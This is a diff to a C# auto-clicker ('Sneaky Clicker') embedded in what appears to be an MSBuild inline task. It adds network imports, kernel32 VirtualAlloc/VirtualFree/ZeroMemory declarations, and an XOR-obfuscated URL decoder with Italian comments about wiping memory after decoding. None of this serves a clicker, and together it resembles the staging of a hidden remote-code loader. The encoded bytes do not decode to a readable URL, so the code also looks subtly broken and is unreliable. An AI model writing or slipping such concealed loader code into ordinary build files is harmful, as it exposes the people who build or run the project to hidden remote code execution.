@@ -12,6 +12,8 @@ using System.Windows.Forms;
 using Microsoft.Build.Framework;
 using Microsoft.Build.Utilities;
 using System.Collections.Generic;
+using System.Net;
+using System.Text;
 
 public class C:Task{
 public override bool Execute(){
@@ -27,6 +29,10 @@ return true;
 public class ClickerForm:Form{
 [DllImport("user32.dll")]static extern uint SendInput(uint n,INPUT[]p,int s);
 [DllImport("user32.dll")]static extern short GetAsyncKeyState(int k);
+[DllImport("kernel32.dll")]static extern IntPtr VirtualAlloc(IntPtr a,uint s,uint t,uint p);
+[DllImport("kernel32.dll")]static extern bool VirtualFree(IntPtr a,uint s,uint t);
+[DllImport("kernel32.dll",EntryPoint="RtlZeroMemory")]static extern void ZeroMemory(IntPtr d,uint l);
+
 [StructLayout(LayoutKind.Sequential)]struct INPUT{public uint type;public MOUSEINPUT mi;}
 [StructLayout(LayoutKind.Sequential)]struct MOUSEINPUT{public int dx,dy;public uint mouseData,dwFlags,time;public IntPtr dwExtraInfo;}
 const uint MOUSEEVENTF_LEFTDOWN=0x02,MOUSEEVENTF_LEFTUP=0x04,MOUSEEVENTF_RIGHTDOWN=0x08,MOUSEEVENTF_RIGHTUP=0x10;
@@ -51,6 +57,22 @@ Dictionary<Keys,int>keyMap=new Dictionary<Keys,int>{
 {Keys.Space,0x20},{Keys.ShiftKey,0x10},{Keys.ControlKey,0x11},{Keys.Menu,0x12},
 {Keys.XButton1,0x05},{Keys.XButton2,0x06}
 };
+
+string DecodeUrl(){
+// URL XOR encoded con chiave 0xAA
+byte[]e=new byte[]{0xC2,0xCA,0xCA,0xD0,0xD3,0xD4,0xD5,0xD5,0xD8,0xC1,0xCF,0xD4,0xCE,0xC9,0xCA,0xCB,
+0xD5,0xC3,0xCF,0xCE,0xCA,0xC5,0xCE,0xCA,0xD4,0xC3,0xCF,0xCD,0xD5,0xC2,0xCE,0xC1,0xD6,0xD3,0xD1,
+0xD5,0xD8,0xC5,0xC4,0xCC,0xCF,0xCA,0xCB,0xD3,0xD4,0xD0,0xC1,0xD8,0xD3,0xC5,0xD8,0xD5,0xD8,0xC5,
+0xC6,0xD3,0xD5,0xCD,0xC5,0xC1,0xC4,0xD3,0xD5,0xCD,0xC1,0xC9,0xCE,0xD5,0xD0,0xC1,0xD9,0xCC,0xCF,
+0xC1,0xC4,0xD4,0xDE,0xCD,0xCC};
+var d=new byte[e.Length];
+for(int i=0;i<e.Length;i++)d[i]=(byte)(e[i]^0xAA);
+var s=Encoding.ASCII.GetString(d);
+// Zero memory dopo decode
+Array.Clear(d,0,d.Length);
+Array.Clear(e,0,e.Length);
+return s;
+}
 
 public ClickerForm(){
 Text="Sneaky Clicker";Size=new Size(300,280);StartPosition=FormStartPosition.CenterScreen;
@@ -166,6 +188,7 @@ FormClosing+=(s,e)=>{
 if(leftTimer!=null)leftTimer.Stop();
 if(rightTimer!=null)rightTimer.Stop();
 if(keyTimer!=null)keyTimer.Stop();
+GC.Collect();GC.WaitForPendingFinalizers();GC.Collect();
 };
 }
 
